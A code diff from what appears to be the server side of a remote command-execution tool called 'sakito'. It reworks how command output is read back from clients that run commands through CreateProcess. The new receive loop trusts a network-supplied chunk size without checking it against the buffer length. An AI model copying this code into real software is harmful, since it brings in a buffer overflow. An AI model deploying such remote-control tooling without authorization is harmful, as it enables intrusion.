@@ -203,7 +203,7 @@ int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 		return SOCKET_ERROR;
 
 	// Receive serialized file size int32_t bytes.
-	if (recv(client_socket, buf, sizeof(int32_t), 0) < 1)
+	if (recv(client_socket, buf, sizeof(uint32_t), 0) < 1)
 		return SOCKET_ERROR;
 
 	// Deserialize f_size.
@@ -273,28 +273,34 @@ int background_client(char* const buf, const size_t cmd_len, SOCKET client_socke
 // Function to send command to client.
 int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
 	// '0' Is the command code for executing a command using CreateProcess via the client.
-	buf[0] = '0';
 
+ 	buf[0] = '0';
 	// Send command to server.
 	if (send(client_socket, buf, cmd_len, 0) < 1)
-		return FAILURE;
+		return SOCKET_ERROR;
 
-	// Initialize i_result to true.
-	int i_result = SUCCESS;
+	memset(buf, '\0', BUFLEN);
+
+	HANDLE s_out = GetStdHandle(STD_OUTPUT_HANDLE);
 
 	// Receive command output stream and write output chunks to stdout.
-	HANDLE s_out = GetStdHandle(STD_OUTPUT_HANDLE);
-	do {
-		i_result = recv(client_socket, buf, BUFLEN, 0);
-		if (buf[0] == EOS[0])
-			break;
-		WriteFile(s_out, buf, i_result, NULL, NULL);
-	} while (i_result > 0);
+	while (1) {
+		if (recv(client_socket, buf, sizeof(uint32_t), 0) < 1)
+			return SOCKET_ERROR;
 
-	// write a single newline to stdout for cmd line output alignment.
+		int32_t chunk_size = ntohl_conv(&*(buf));
+
+		if (chunk_size == 0)
+			break;
+
+		if (recv(client_socket, buf, chunk_size, 0) < 1)
+			return SOCKET_ERROR;
+
+		WriteFile(s_out, buf, chunk_size, NULL, NULL);
+	}
 	fputc('\n', stdout);
 
-	return i_result;
+	return SUCCESS;
 }
 
 // Function to resize s_map array/remove and close connection.
@@ -384,11 +390,11 @@ void interact(Server_map* s_map) {
 }
 
 void exec_cmd(Server_map* s_map) {
-	sakito_win_cp((SOCKET)NULL, s_map->buf);
+	sakito_win_cp(NULL, s_map->buf);
 	fputc('\n', stdout);
 }
 
-void sakito_console(Server_map* s_map) {
+void sakito_console(Server_map *s_map) {
 	// Saktio console loop.
 	while (1) {
 		GetCurrentDirectory(BUFLEN, s_map->buf);
